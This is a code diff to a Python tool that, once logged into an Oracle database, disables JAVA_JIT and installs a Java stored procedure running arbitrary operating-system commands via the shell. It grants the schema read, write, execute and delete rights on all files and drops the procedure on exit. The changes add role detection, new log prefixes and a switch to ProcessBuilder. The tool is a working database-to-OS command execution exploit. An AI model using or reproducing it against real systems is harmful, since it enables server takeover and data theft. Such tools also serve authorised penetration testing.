@@ -8,6 +8,10 @@ import getopt
 import base64
 
 #log
+def success(text):
+	text = "[+]%s"%text
+	return print(text)
+
 def normal(text):
 	text = "[*]%s"%text
 	return print(text)
@@ -21,14 +25,14 @@ def error(text):
 	return print(text)
 
 def executeresult(text):
-	text = "[+]%s"%text
+	text = "[>]%s"%text
 	return print(text)
 
 #login
 def login(user,pwd,host,port,sid):
 	try:
 		db = cx_Oracle.connect("%s"%user,"%s"%pwd,"%s:%s/%s"%(host,port,sid))
-		normal("Login successfully, DB version:%s"%db.version)
+		success("Login successfully, DB version:%s"%db.version)
 		return db
 	except Exception as e:
 		error(e)
@@ -48,16 +52,25 @@ def getPlatform(cur):
 	except Exception as e:
 		error(e)
 
+def getRole(cur):
+	try:
+		query = "select user from dual"
+		cur.execute(query)
+		result = cur.fetchone()
+		normal("Current Role:%s"%result)
+		return result
+	except Exception as e:
+		error(e)
 #disable JAVA_JIT
 def JAVA_JIT(cur):
 	query = "alter system set JAVA_JIT_ENABLED= FALSE scope = both"
 	try:
 		cur.execute(query)
-		normal("JAVA_JIT Disabled")
+		success("JAVA_JIT Disabled")
 	except Exception as e:
 		error(e)
 
-def CreatePLSQL(cur,usr):
+def CreatePLSQL(cur,role):
 	query1 = """
 		CREATE OR REPLACE AND COMPILE 
 		JAVA SOURCE NAMED "Host" 
@@ -80,10 +93,10 @@ def CreatePLSQL(cur,usr):
 		        finalCommand[1] = "-c";
 		        finalCommand[2] = "PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/git/bin:/usr/local/sbin:~/bin;export PATH;"+command;
 		      }
-		  
-		      final Process pr = Runtime.getRuntime().exec(finalCommand);
-		      pr.waitFor();
-		      //final PrintStream ps = new PrintStream("C:\\\\users\\\\public\\\\log.txt"); // Write log
+		      ProcessBuilder processBuilder = new ProcessBuilder(finalCommand);
+			  final Process pr = processBuilder.start();
+			  pr.waitFor();
+			  //final PrintStream ps = new PrintStream("C:\\\\users\\\\public\\\\log.txt"); // Write log
 		      new Thread(new Runnable(){
 		        public void run() {
 		          BufferedReader br_in = null;
@@ -159,28 +172,26 @@ def CreatePLSQL(cur,usr):
 		  DBMS_JAVA.grant_permission(l_schema, 'java.io.FilePermission', '<<ALL FILES>>', 'read ,write, execute, delete');
 		  DBMS_JAVA.grant_permission(l_schema, 'SYS:java.lang.RuntimePermission', 'writeFileDescriptor', '');
 		  DBMS_JAVA.grant_permission(l_schema, 'SYS:java.lang.RuntimePermission', 'readFileDescriptor', '');
-		  DBMS_JAVA.grant_permission(l_schema, 'SYS:java.lang.RuntimePermission', 'getenv.SystemRoot', '');
-          DBMS_JAVA.grant_permission(l_schema, 'SYS:java.lang.RuntimePermission', 'setIO', '' );
+		  DBMS_JAVA.grant_permission(l_schema, 'SYS:java.lang.RuntimePermission', 'setIO', '' );
 		END;
-	"""%user
-    #setIO: read and write file
-
+	"""%role
+	#setIO: read and write file
 	try:
 		cur.execute(query1)
-		normal("Java Created")
+		success("Java Created")
 		cur.execute(query2)
-		normal("Procedure Created")
+		success("Procedure Created")
 		try:
 			cur.execute(query3)
-			normal("\"%s\" Permission Granted"%user)
+			success("\"%s\" Permission Granted"%role)
 		except Exception as e:
-			warning("\"%s\" Permission NOT Granted"%user)
+			error("\"%s\" Permission NOT Granted"%role)
 			warning(e)
 			pass
 		cur.callproc("dbms_output.enable", (1024,))
 		cur.callproc("dbms_java.set_output",(100000,))
-		normal("Enable OutPut")
-		normal("PL/SQL Procedure successfully completed")
+		success("Enable OutPut")
+		success("PL/SQL Procedure successfully completed")
 		#normal("Grant Successfully")
 		print("="*64)
 		return cur
@@ -236,7 +247,7 @@ def dropproc(cur):
 def quit(signum, frame):
 	dropproc(cur)
 	print()
-	warning("Procedure Dropped")
+	success("Procedure Dropped")
 	sys.exit()
 
 #default
@@ -275,10 +286,14 @@ normal("Target: %s:%s/%s"%(host,port,sid))
 db = login(user,pwd,host,port,sid)
 cur = db.cursor()
 platform = getPlatform(cur)
+try:
+	role = getRole(cur)
+except:
+	role = user
 signal.signal(signal.SIGINT, quit)
 signal.signal(signal.SIGTERM, quit)
 JAVA_JIT(cur)
-CreatePLSQL(cur,user)
+CreatePLSQL(cur,role)
 executeresult("Execute Command:")
 #Different Platform
 if platform == "Linux":
